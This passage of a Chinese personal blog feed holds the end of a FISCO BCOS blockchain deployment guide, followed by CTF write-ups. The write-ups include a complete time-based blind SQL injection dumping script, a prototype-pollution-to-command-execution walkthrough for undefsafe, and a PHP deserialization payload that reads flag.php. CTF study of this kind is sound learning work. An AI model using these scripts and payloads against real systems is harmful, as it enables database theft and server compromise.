id="证书授权机构将机构证书发送给机构，机构放到meta目录下面"><a href="#证书授权机构将机构证书发送给机构，机构放到meta目录下面" class="headerlink" title="证书授权机构将机构证书发送给机构，机构放到meta目录下面"></a>证书授权机构将机构证书发送给机构，机构放到meta目录下面</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ./dir_agency_ca/agencyA/* ~/generator-A/meta/</span><br></pre></td></tr></table></figure><h3 id="3-2-初始化机构B"><a href="#3-2-初始化机构B" class="headerlink" title="3.2 初始化机构B"></a>3.2 初始化机构B</h3><h1 id="生成机构B的证书"><a href="#生成机构B的证书" class="headerlink" title="生成机构B的证书"></a>生成机构B的证书</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./generator --generate_agency_certificate ./dir_agency_ca ./dir_chain_ca agencyB</span><br></pre></td></tr></table></figure><h1 id="证书授权机构将机构证书发送给机构，机构放到meta目录下面-1"><a href="#证书授权机构将机构证书发送给机构，机构放到meta目录下面-1" class="headerlink" title="证书授权机构将机构证书发送给机构，机构放到meta目录下面"></a>证书授权机构将机构证书发送给机构，机构放到meta目录下面</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ./dir_agency_ca/agencyB/* ~/generator-B/meta/</span><br></pre></td></tr></table></figure><h3 id="3-3-机构A修改配置文件"><a href="#3-3-机构A修改配置文件" class="headerlink" title="3.3 机构A修改配置文件"></a>3.3 机构A修改配置文件</h3><h1 id="进入机构A修改node-deployment-ini节点配置文件、生成节点配置文件夹。"><a href="#进入机构A修改node-deployment-ini节点配置文件、生成节点配置文件夹。" class="headerlink" title="进入机构A修改node_deployment.ini节点配置文件、生成节点配置文件夹。"></a>进入机构A修改node_deployment.ini节点配置文件、生成节点配置文件夹。</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/generator-A</span><br><span class="line">cat &gt; ./conf/node_deployment.ini&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[group]</span></span><br><span class="line"><span class="string">group_id=1</span></span><br><span class="line"><span class="string">[node0]</span></span><br><span class="line"><span class="string">; host ip for the communication among peers.</span></span><br><span class="line"><span class="string">; Please use your ssh login ip.</span></span><br><span class="line"><span class="string">p2p_ip=you_ip</span></span><br><span class="line"><span class="string">; listen ip for the communication between sdk clients.</span></span><br><span class="line"><span class="string">; This ip is the same as p2p_ip for physical host.</span></span><br><span class="line"><span class="string">; But for virtual host e.g. vps servers, it is usually different from p2p_ip.</span></span><br><span class="line"><span class="string">; You can check accessible addresses of your network card.</span></span><br><span class="line"><span class="string">; Please seehttps://tecadmin.net/check-ip-address-ubuntu-18-04-desktop/</span></span><br><span class="line"><span class="string">; for more instructions.</span></span><br><span class="line"><span class="string">rpc_ip=0.0.0.0</span></span><br><span class="line"><span class="string">channel_ip=0.0.0.0</span></span><br><span class="line"><span class="string">p2p_listen_port=30300</span></span><br><span class="line"><span class="string">channel_listen_port=20200</span></span><br><span class="line"><span class="string">jsonrpc_listen_port=8545</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure><h3 id="3-4-机构B修改配置文件"><a href="#3-4-机构B修改配置文件" class="headerlink" title="3.4 机构B修改配置文件"></a>3.4 机构B修改配置文件</h3><h1 id="进入机构B修改node-deployment-ini节点配置文件、生成节点配置文件夹。"><a href="#进入机构B修改node-deployment-ini节点配置文件、生成节点配置文件夹。" class="headerlink" title="进入机构B修改node_deployment.ini节点配置文件、生成节点配置文件夹。"></a>进入机构B修改node_deployment.ini节点配置文件、生成节点配置文件夹。</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/generator-B</span><br><span class="line">cat &gt; ./conf/node_deployment.ini&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">[group]</span></span><br><span class="line"><span class="string">group_id=1</span></span><br><span class="line"><span class="string">[node0]</span></span><br><span class="line"><span class="string">; host ip for the communication among peers.</span></span><br><span class="line"><span class="string">; Please use your ssh login ip.</span></span><br><span class="line"><span class="string">p2p_ip=you_ip_B</span></span><br><span class="line"><span class="string">; listen ip for the communication between sdk clients.</span></span><br><span class="line"><span class="string">; This ip is the same as p2p_ip for physical host.</span></span><br><span class="line"><span class="string">; But for virtual host e.g. vps servers, it is usually different from p2p_ip.</span></span><br><span class="line"><span class="string">; You can check accessible addresses of your network card.</span></span><br><span class="line"><span class="string">; Please seehttps://tecadmin.net/check-ip-address-ubuntu-18-04-desktop/</span></span><br><span class="line"><span class="string">; for more instructions.</span></span><br><span class="line"><span class="string">rpc_ip=0.0.0.0</span></span><br><span class="line"><span class="string">channel_ip=0.0.0.0</span></span><br><span class="line"><span class="string">p2p_listen_port=30300</span></span><br><span class="line"><span class="string">channel_listen_port=20200</span></span><br><span class="line"><span class="string">jsonrpc_listen_port=8545</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure><h3 id="3-5-机构A生成并发送节点信息"><a href="#3-5-机构A生成并发送节点信息" class="headerlink" title="3.5 机构A生成并发送节点信息"></a>3.5 机构A生成并发送节点信息</h3><h1 id="生成机构A节点证书和P2P连接地址文件，根据上面修改的node-depoyment-ini生成"><a href="#生成机构A节点证书和P2P连接地址文件，根据上面修改的node-depoyment-ini生成" class="headerlink" title="生成机构A节点证书和P2P连接地址文件，根据上面修改的node_depoyment.ini生成"></a>生成机构A节点证书和P2P连接地址文件，根据上面修改的node_depoyment.ini生成</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/generator-A</span><br><span class="line">./generator --generate_all_certificates ./agencyA_node_info</span><br></pre></td></tr></table></figure><h1 id="机构生成节点时需要指定其他节点的P2P连接地址，这里A机构把P2P连接机构发送给了B机构"><a href="#机构生成节点时需要指定其他节点的P2P连接地址，这里A机构把P2P连接机构发送给了B机构" class="headerlink" title="机构生成节点时需要指定其他节点的P2P连接地址，这里A机构把P2P连接机构发送给了B机构"></a>机构生成节点时需要指定其他节点的P2P连接地址，这里A机构把P2P连接机构发送给了B机构</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ./agencyA_node_info/peers.txt ~/generator-B/meta/peersA.txt</span><br></pre></td></tr></table></figure><h3 id="3-6-机构B生成并发送节点信息"><a href="#3-6-机构B生成并发送节点信息" class="headerlink" title="3.6 机构B生成并发送节点信息"></a>3.6 机构B生成并发送节点信息</h3><h1 id="生成机构A节点证书和P2P连接地址文件，根据上面修改的node-depoyment-ini生成-1"><a href="#生成机构A节点证书和P2P连接地址文件，根据上面修改的node-depoyment-ini生成-1" class="headerlink" title="生成机构A节点证书和P2P连接地址文件，根据上面修改的node_depoyment.ini生成"></a>生成机构A节点证书和P2P连接地址文件，根据上面修改的node_depoyment.ini生成</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/generator-B</span><br><span class="line">./generator --generate_all_certificates ./agencyB_node_info</span><br></pre></td></tr></table></figure><h1 id="因为需要生成创世区块，规定此机构必须要节点证书。B机构除了要发送P2P连接地址之外还要发送节点证书。"><a href="#因为需要生成创世区块，规定此机构必须要节点证书。B机构除了要发送P2P连接地址之外还要发送节点证书。" class="headerlink" title="因为需要生成创世区块，规定此机构必须要节点证书。B机构除了要发送P2P连接地址之外还要发送节点证书。"></a>因为需要生成创世区块，规定此机构必须要节点证书。B机构除了要发送P2P连接地址之外还要发送节点证书。</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp ./agencyB_node_info/cert*.crt ~/generator-A/meta/</span><br><span class="line">cp ./agencyB_node_info/peers.txt ~/generator-A/meta/peersB.txt</span><br></pre></td></tr></table></figure><h3 id="3-7-机构A生成群组1创世区块"><a href="#3-7-机构A生成群组1创世区块" class="headerlink" title="3.7 机构A生成群组1创世区块"></a>3.7 机构A生成群组1创世区块</h3><h1 id="来生成创世区块。这里实际可以通过协商由那个机构生成，不一定是A。"><a href="#来生成创世区块。这里实际可以通过协商由那个机构生成，不一定是A。" class="headerlink" title="来生成创世区块。这里实际可以通过协商由那个机构生成，不一定是A。"></a>来生成创世区块。这里实际可以通过协商由那个机构生成，不一定是A。</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/generator-A</span><br><span class="line">cat &gt; ./conf/group_genesis.ini&lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">[group]</span></span><br><span class="line"><span class="string">group_id=1</span></span><br><span class="line"><span class="string">;i am xiaoyue</span></span><br><span class="line"><span class="string">;my blog-s x1a0.net </span></span><br><span class="line"><span class="string">;yea i love you~</span></span><br><span class="line"><span class="string">[nodes]</span></span><br><span class="line"><span class="string">node0=you_ip:30300</span></span><br><span class="line"><span class="string">node1=you_ip_b:30300</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">./generator --create_group_genesis ./group</span><br></pre></td></tr></table></figure><h1 id="把group1的创世区块发送给B机构"><a href="#把group1的创世区块发送给B机构" class="headerlink" title="把group1的创世区块发送给B机构"></a>把group1的创世区块发送给B机构</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp ./group/group.1.genesis ~/generator-B/meta</span><br></pre></td></tr></table></figure><h2 id="3-8-机构A生成所属节点"><a href="#3-8-机构A生成所属节点" class="headerlink" title="3.8 机构A生成所属节点"></a>3.8 机构A生成所属节点</h2><h1 id="生成机构A的节点"><a href="#生成机构A的节点" class="headerlink" title="生成机构A的节点"></a>生成机构A的节点</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/generator-A</span><br><span class="line">./generator --build_install_package ./meta/peersB.txt ./nodeA</span><br></pre></td></tr></table></figure><h1 id="启动节点"><a href="#启动节点" class="headerlink" title="启动节点"></a>启动节点</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash ./nodeA/start_all.sh</span><br></pre></td></tr></table></figure><p>上面有两个需要注意的地方：<br>1.在生产节点配置文件和创世区块配置文件时端口一致是没问题的，因为我不在一台机子上做测试，不会存在端口冲突的情况。但这样在复制B机构到B机子上的时候跑不起来就很尴尬。<br>2.rpc的ip默认是127.0.0.1，如果硬要开启的话会报警告：<br><img src="https://img-blog.csdnimg.cn/20200721234739617.png" alt="在这里插入图片描述"><br>如果非要开启rpc测试的话，也可以参照上面说的开启防火墙ip白名单。</p><hr><h2 id="4-B机构转移并生成节点"><a href="#4-B机构转移并生成节点" class="headerlink" title="4.B机构转移并生成节点"></a>4.B机构转移并生成节点</h2><p>压缩：<code>tar cvf B.tar generator-B</code><br>解压：<code>tar xvf B.tar</code><br>然后上传下载操作</p><h3 id="4-1-生成-amp-启动节点："><a href="#4-1-生成-amp-启动节点：" class="headerlink" title="4.1 生成&amp;启动节点："></a>4.1 生成&amp;启动节点：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./generator --build_install_package ./meta/peersA.txt ./nodeB</span><br><span class="line">Copy to clipboard</span><br></pre></td></tr></table></figure><p>机构B启动节点：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash ./nodeB/start_all.sh</span><br></pre></td></tr></table></figure><hr><h3 id="Z-查看共识状态"><a href="#Z-查看共识状态" class="headerlink" title="Z.查看共识状态"></a>Z.查看共识状态</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tail -f ./node*/node*/<span class="built_in">log</span>/<span class="built_in">log</span>*  | grep +++</span><br></pre></td></tr></table></figure><p>正确回显如下：<br><img src="https://img-blog.csdnimg.cn/20200721235803290.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW95dWUyMDE5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里还有一个问题。就是上面说的对自己自信不进行测试，导致ip输错了导致共识失败，这时候是没有回显的。把后面的正则删掉就行了。能看到日志报错，通过报错去找不能共识的原因。</p><hr><p><del>广告墙</del> ：<br><img src="https://img-blog.csdnimg.cn/2020072200040719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW95dWUyMDE5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><blockquote><p><em>参考：<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/enterprise_tools/tutorial_detail_operation.html">https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/enterprise_tools/tutorial_detail_operation.html</a></em></p></blockquote>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;今天凌晨交的POC，现在复现完组网过程就可以碎觉了，emm~&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&quot;0-需求分析&quot;&gt;&lt;a href=&quot;#0-需求分析&quot; class=&quot;headerlink&quot; title=&quot;0.需求分析&quot;&gt;&lt;/a&gt;0.需求分析&lt;/h2&gt;&lt;p&gt;有两台服务器，狗子哥说</summary>
+      
+    
+    
+    
+    <category term="区块链" scheme="https://x1a0.net/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>ENS使用指南（隐藏文章）</title>
+    <link href="https://x1a0.net/2020/07/12/185/"/>
+    <id>https://x1a0.net/2020/07/12/185/</id>
+    <published>2020-07-11T16:00:18.000Z</published>
+    <updated>2020-07-11T16:00:18.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>pass</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;pass&lt;/p&gt;
+</summary>
+      
+    
+    
+    
+    <category term="杂项" scheme="https://x1a0.net/categories/%E6%9D%82%E9%A1%B9/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>技能树搭建之time-based blind+脚本</title>
+    <link href="https://x1a0.net/2020/05/23/171/"/>
+    <id>https://x1a0.net/2020/05/23/171/</id>
+    <published>2020-05-22T16:53:55.000Z</published>
+    <updated>2020-05-22T16:53:55.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>时间盲注和布尔盲注有异曲同工之妙。<br>“1 and ascii(substr(database(),{},{}))={} %23”<br>“1 and if(ascii(substring(database(),{},1))={},sleep(3),1) –+”<br>说是异曲同工，不如说是一模一样..<br>多了个if判断，正确sleep，错误返回1</p><p>如此，（便不能成为你不重写脚本的原因）</p><p><img src="https://oss.x1a0.net/image/2020/05/23/662842698998130/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200523004857.png" alt="微信截图_20200523004857.png"></p><hr><p>有提示，数字型注入。</p><p>翻找了之前的blind脚本，修改下：</p><pre><code>import requests,timeurl=&#39;http://challenge-b809a1815ce6a2f0.sandbox.ctfhub.com:10080/?id=&#123;&#125;&#39;# ---------设置payload（默认数字型注入）---------Get_db_payload=&quot;1 and if(ascii(substring(database(),&#123;&#125;,1))=&#123;&#125;,sleep(3),1) --+&quot;Get_table_payload=&quot;1 and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit &#123;&#125;,&#123;&#125;),&#123;&#125;,1))=&#123;&#125;,sleep(3),1) --+&quot;Get_columns_payload=&quot;1 and if(ascii(substring((select column_name from information_schema.columns where table_schema=database() and table_name=&#39;&#123;&#125;&#39; limit &#123;&#125;,&#123;&#125;),&#123;&#125;,1))=&#123;&#125;,sleep(3),1) --+&quot;Get_dump_payload=&quot;1 and if(ascii(substring((select &#123;&#125; from &#123;&#125; limit &#123;&#125;,&#123;&#125;),&#123;&#125;,1))=&#123;&#125;,sleep(3),1) --+&quot;# ----------------------------------------------# ---------设置返回正确页面提示，和header--------if_data=&#39;query_success&#39;key=[&#39;&#123;&#39;,&#39;&#125;&#39;, &#39;@&#39;, &#39;_&#39;,&#39;,&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;j&#39;,&#39;h&#39;,&#39;i&#39;,&#39;g&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;,&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;G&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;,&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;]headers=&#123;&#125;# ----------------------------------------------def Get_db():    db_text,num,_=&#39;&#39;,1,&quot;&quot;    while 1:        for i in key:            _=db_text   # temp变量相当于记录上一轮的值，如果判断和这轮相等，那么就return，这样就不用获取数据库长度了。            payload=Get_db_payload.format(num,ord(i))            start_time=time.time()            requests.get(url.format(payload))            stop_time=time.time()            if stop_time-start_time&gt;2:                db_text+=i                num+=1                break        if db_text==_:            return db_text        print(&#39;[+]out:&#39;+db_text)def Get_table():    tables=[]    for num_biao in range(1,9999999):        tables.append(&#39;&#39;)        last=&#39;&#39;        for ranking_biao in range(1,99999999):            for i in key:                last=tables[num_biao-1]                payload=Get_table_payload.format(num_biao-1,num_biao,ranking_biao,ord(i))                start_time=time.time()                requests.get(url.format(payload))                stop_time=time.time()                if stop_time-start_time&gt;2:                    tables[num_biao-1]+=i                    break            if last==tables[num_biao-1]:                break        if tables[num_biao-1]==&#39;&#39;:            tables.pop()            return tables        print(&#39;[+]out:&#39;+tables[num_biao-1])def Get_columns(table):    columns=[]    for columns_num in range(1,999999):        columns.append(&#39;&#39;)        last=&#39;&#39;        for columns_ranking in range(1,999999):            for i in key:                last=columns[columns_num-1]                payload=Get_columns_payload.format(table,columns_num-1,1,columns_ranking,ord(i))                st=time.time()                requests.get(url.format(payload))                stt=time.time()                if stt-st&gt;2:                    columns[columns_num-1]+=i                    break            if last==columns[columns_num-1]:                break        print(columns)        if columns[columns_num-1]==&#39;&#39;:            columns.pop()            return columns        print(&#39;[+]out:&#39;+columns[columns_num-1])def Get_dump(column,table):    data=[]    for i in range(1,999999):        data.append(&#39;&#39;)        temp=&#39;&#39;        for j in range(1,999999):            for k in key:                temp=data[i-1]                payload=Get_dump_payload.format(column,table,i-1,1,j,ord(k))                s=time.time()                requests.get(url.format(payload))                t=time.time()                if t-s&gt;2:                    data[i-1]+=k                    break            if temp==data[i-1]:                break            print(data[i-1])        if data[i-1]==&#39;&#39;:            data.pop()            return data        print(&quot;[+]out:&quot;+data[i-1])if __name__ == &quot;__main__&quot;:    Get_dump(&#39;flag&#39;,&#39;flag&#39;)</code></pre><p><img src="https://oss.x1a0.net/image/2020/05/23/664002387726255/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200523005313.png" alt="微信截图_20200523005313.png"></p><hr><p>wo~~ </p><p>我自横刀向天笑，<br>去留肝胆两昆仑！</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;时间盲注和布尔盲注有异曲同工之妙。&lt;br&gt;“1 and ascii(substr(database(),{},{}))={} %23”&lt;br&gt;“1 and if(ascii(substring(database(),{},1))={},sleep(3),1) –+”&lt;br&gt;</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="https://x1a0.net/categories/CTF/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>JavaScript原型链污染学习和CTFweb题应用</title>
+    <link href="https://x1a0.net/2020/05/17/158/"/>
+    <id>https://x1a0.net/2020/05/17/158/</id>
+    <published>2020-05-17T08:04:00.000Z</published>
+    <updated>2020-05-17T08:07:58.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>在js中和Python一样，万物皆对象。以此为基础可能好理解一点。</p><p>首先要理解prototype和_proto_。（我理解不了）</p><p><img src="https://oss.x1a0.net/image/2020/05/17/984583893648757/787416-20160323103557261-114570044.png" alt="787416-20160323103557261-114570044.png"></p><hr><p>prototype是函数才有的，__proto__是每个对象都有的。<br>这里new了一个b之后发现prototype是空。</p><p><img src="https://oss.x1a0.net/image/2020/05/17/983863310930954/1.PNG" alt="1.PNG"></p><hr><p>而每一个proto都会指向上一级的prototype：</p><pre><code>&gt; b.__proto__===a.prototypetrue</code></pre><p>原型链就是由proto一级一级构成的：<br>（我不知道能不能理解为a的proto就是a的原型对象，a.proto.proto就是object的原型对象，a.pro.pro.pro就是null。）</p><p><img src="https://oss.x1a0.net/image/2020/05/17/988672724562597/2.PNG" alt="2.PNG"></p><p>引用一句总结：</p><blockquote><p>每个构造函数(constructor)都有一个原型对象(prototype)<br>对象的__proto__属性，指向类的原型对象prototype<br>JavaScript使用prototype链实现继承机制</p></blockquote><p>那么原型链污染就是通过能修改函数的proto属性去更改上级类：</p><p><img src="https://oss.x1a0.net/image/2020/05/17/993602229083107/3.PNG" alt="3.PNG"></p><hr><p>这里通过修改test1的proto去更改了test类中的name。<br>导致再实例化出test2的时候他的name值就成了1111111.</p><p>最后就是网鼎杯的notes了。<br><strong>[网鼎杯 2020 青龙组]notes：</strong><br>有源码，可以执行命令：</p><p><img src="https://oss.x1a0.net/image/2020/05/17/014263058503030/4.PNG" alt="4.PNG"></p><hr><p>只能执行commands里面的。但是这里这个列表是不可控的。<br>所以只能去搞他的上级。就像这样：</p><p><img src="https://oss.x1a0.net/image/2020/05/17/016492539927487/5.PNG" alt="5.PNG"></p><hr><p>这里commands本来只有两个元素，但是使用payload的proto污染字典后，commands中多出了c。<br>所以想办法找到一个可以操作字典的地方就行了。</p><p><img src="https://oss.x1a0.net/image/2020/05/17/01924736909205/6.PNG" alt="6.PNG"></p><hr><p>这里跟进add_note路由找到write_note，发现键名是不可控的。<br>但是他下面的edit_note键名是可控的。<br>undefsafe(this.note_list, id + ‘.author’, author);<br>这里如果id=__proto__那么就相当于上面的payload.<strong>proto</strong>.author=author<br>所以只要id传入__proto__，author传入命令即可。<br>但是：</p><p><img src="https://oss.x1a0.net/image/2020/05/17/024062490575510/7.PNG" alt="7.PNG"></p><hr><p>edit_note路由中有个判断要求raw也要有数据。 呢么post的时候可以发发牢骚。</p><p><img src="https://oss.x1a0.net/image/2020/05/17/02559485660452/8.PNG" alt="8.PNG"></p><hr><p>然后去status执行应该就能打过来了：<br><img src="https://oss.x1a0.net/image/2020/05/17/026263664502363/9.PNG" alt="9.PNG"></p><p>study：<br><a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940">https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940</a><br><a href="https://imagin.vip/?p=1391#">https://imagin.vip/?p=1391#</a> notes<br><a href="https://github.com/remy/undefsafe/commit/f272681b3a50e2c4cbb6a8533795e1453382c822">https://github.com/remy/undefsafe/commit/f272681b3a50e2c4cbb6a8533795e1453382c822</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;在js中和Python一样，万物皆对象。以此为基础可能好理解一点。&lt;/p&gt;
+&lt;p&gt;首先要理解prototype和_proto_。（我理解不了）&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;https://oss.x1a0.net/image/2020/05/17/9845838936</summary>
+      
+    
+    
+    
+    <category term="CTF" scheme="https://x1a0.net/categories/CTF/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>网鼎杯两道web</title>
+    <link href="https://x1a0.net/2020/05/14/144/"/>
+    <id>https://x1a0.net/2020/05/14/144/</id>
+    <published>2020-05-14T15:18:00.000Z</published>
+    <updated>2020-05-14T17:25:51.000Z</updated>
+    
+    <content type="html"><![CDATA[<p>复下盘。<br>首先是自己唯一做出来的web。而且做了一下午，这tm还是web的签到题..</p><p><strong>AreUSerialz：</strong></p><pre><code>&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;    protected $op;    protected $filename;    protected $content;    function __construct() &#123;        $op = &quot;1&quot;;        $filename = &quot;/tmp/tmpfile&quot;;        $content = &quot;Hello World!&quot;;        $this-&gt;process();    &#125;    public function process() &#123;        if($this-&gt;op == &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;            $res = $this-&gt;read();            $this-&gt;output($res);        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;    private function write() &#123;        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;            if(strlen((string)$this-&gt;content) &gt; 100) &#123;                $this-&gt;output(&quot;Too long!&quot;);                die();            &#125;            $res = file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        &#125; else &#123;            $this-&gt;output(&quot;Failed!&quot;);        &#125;    &#125;    private function read() &#123;        $res = &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res = file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;    private function output($s) &#123;        echo &quot;[Result]: &lt;br&gt;&quot;;        echo $s;    &#125;    function __destruct() &#123;        if($this-&gt;op === &quot;2&quot;)            $this-&gt;op = &quot;1&quot;;        $this-&gt;content = &quot;&quot;;        $this-&gt;process();    &#125;&#125;function is_valid($s) &#123;    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;    $str = (string)$_GET[&#39;str&#39;];    if(is_valid($str)) &#123;        $obj = unserialize($str);    &#125;&#125;</code></pre><p>很明确说明flag在flag.php里面。因该是要反序列化读文件，或者写马子。<br>先看析构函数：<br>    function __destruct() {<br>        if($this-&gt;op === “2”)<br>            $this-&gt;op = “1”;<br>        $this-&gt;content = “”;<br>        $this-&gt;process();<br>    }</p><p>这里当op全等‘2’的时候就会被置为1，但是当op为1的时候就会进入write：</p><pre><code>$res = file_put_contents($this-&gt;filename, $this-&gt;content);</code></pre><p>在这里卡了很久，因为析构函数中把content置为空了，我测试了下如果第二个参数为空就会返回false。<br>所以当时报failed报了一下午。。</p><p>所以写马子这条路是不通的，结合这里和process的弱判断可得，应该是要直接读。<br>直接赋值op=2，由于destruct中没有对filename进行赋值。<br>我们现在可控的参数只有op和filename。<br>当op=2，filename=‘flag.php’的时候，就能读了。</p><p>payload：</p><pre><code>&lt;?phpclass FileHandler &#123;    public $op;    public $filename;    public $content;&#125;;$tmp=new FileHandler();$tmp-&gt;op=2;$tmp-&gt;filename=&#39;flag.php&#39;;// php://filter/read=convert.base64-encode/resource=flag.php$s_tmp=serialize($tmp);echo $s_tmp;unserialize($s_tmp);?&gt;</code></pre><p>当时读的时候没出东西，想了想因该是在注释或者变量中什么的。就元封装器：</p><p><img src="https://oss.x1a0.net/image/2020/05/14/54132583744117/1.PNG" alt="1.PNG"></p><hr><p>然后第二道：<br><strong>filejava</strong><br>不会java 还是跟着wp做一下。<br>事后再去看。servlet什么的。</p><p>上传文件后有文件读取，路径：<a 